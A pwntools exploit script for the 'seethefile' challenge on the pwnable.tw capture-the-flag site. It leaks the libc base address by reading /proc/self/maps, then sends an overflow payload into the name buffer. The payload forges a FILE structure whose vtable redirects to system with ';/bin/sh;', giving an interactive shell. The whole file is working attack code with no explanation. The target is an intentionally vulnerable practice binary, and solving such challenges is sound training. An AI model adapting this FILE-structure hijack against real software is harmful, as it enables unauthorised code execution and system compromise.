#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./seethefile_patched', env = {'LD_PRELOAD': './libc_32.so.6'})
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x08048B0F
				b*system
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10200)

	return s

s = conn()

binary = ELF('seethefile')
libc = ELF('libc_32.so.6')

s.sendlineafter(b'Your choice :', b'1')
s.sendlineafter(b'What do you want to see :', b'/proc/self/maps')

s.sendlineafter(b'Your choice :', b'2')
s.sendlineafter(b'Your choice :', b'2')

s.sendlineafter(b'Your choice :', b'3')

s.recvline()

libc.address = int(s.recv(8).decode(), 16)

log.info('libc base: 0x%x', libc.address)

log.info('system: 0x%x', libc.symbols['system'])

s.sendlineafter(b'Your choice :', b'5')

payload = p32(0xffffdfff) + b';/bin/sh;\x00' + b'A' * 18 + p32(binary.symbols['name']) + b'A' * 36 + p32(binary.symbols['filename'] + 0x20) + p32(binary.symbols['name'] + 0x48) + p32(libc.symbols['system']) 

s.sendlineafter(b'Leave your name :', payload)

s.interactive()
